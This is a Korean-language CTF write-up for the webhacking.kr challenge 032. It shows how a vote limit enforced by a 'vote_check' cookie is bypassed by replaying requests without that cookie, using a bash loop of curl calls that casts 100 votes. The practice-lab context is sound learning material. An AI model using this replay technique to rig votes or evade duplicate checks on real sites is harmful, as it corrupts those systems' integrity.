---
layout: post
title: webhacking.kr 032
category: Web
rpath: /resource/webhacking.kr_032
tag: [burp_suite, repeater] 
---

**Category:** Web

**Source:** webhacking.kr

**Points:** 150

**Author:** Jisoon Park(js00n.park)

**Description:** 

>![img]({{page.rpath|prepend:site.baseurl}}/prob.png)

## Write-up

RANK가 있는 걸로 봐서는 뭔가 순위를 보여주는 페이지인것 같다.

아무 ID(여기서는 younghero)나 클릭해보면 HIT 점수가 1 오르는 것을 볼 수 있었다.

![img]({{page.rpath|prepend:site.baseurl}}/vote.png)

한번 더 클릭했을 때는 no라는 메세지가 나오고 더이상 HIT 점수가 오르지 않았다.

![img]({{page.rpath|prepend:site.baseurl}}/error.png)

뭐가 다르지 하고 두 번의 request 내용을 비교해 봤더니, cookie에 "vote_check=ok"라는 내용이 추가된 것을 알 수 있었다.

![img]({{page.rpath|prepend:site.baseurl}}/req1.png)

![img]({{page.rpath|prepend:site.baseurl}}/req2.png)

첫번째 request의 response를 보면 cookie가 추가되는 것을 명시적으로 확인할 수 있다.

![img]({{page.rpath|prepend:site.baseurl}}/setcookie.png)

맨 아래쪽의 join 버튼을 누르면 차트에 진입할 수 있는데, 일단 진입한거 1등을 달성해보자.

vote_check이 들어가지 않은 request를 반복적으로 보내면 될거 같다.

코딩하기 귀찮아서 burp suite의 repeater 기능을 이용했는데, 이것도 100번을 누르려니 귀찮아서 curl command로 복사(Copy as curl command)해서 결국 간단히 쉘 코딩을 하고 말았다.

```bash
#!/bin/bash

c=1
while [ $c -le 100 ]
do
    curl -i -s -k  -X $'GET' \
    -H $'Host: webhacking.kr' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H $'Referer: http://webhacking.kr/challenge/codeing/code5.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9,ko;q=0.8' -H $'Cookie:  PHPSESSID=1f2df9a71e78841959b0656b05a2cadb' -H $'Connection: close' \
    -b $'PHPSESSID=1f2df9a71e78841959b0656b05a2cadb' \
    $'http://webhacking.kr/challenge/codeing/code5.html?hit=matta'

    ((c++))
done
```

코드를 실행해서 투표 점수가 100점을 넘으니 문제를 해결할 수 있었다.

![img]({{page.rpath|prepend:site.baseurl}}/flag.png)
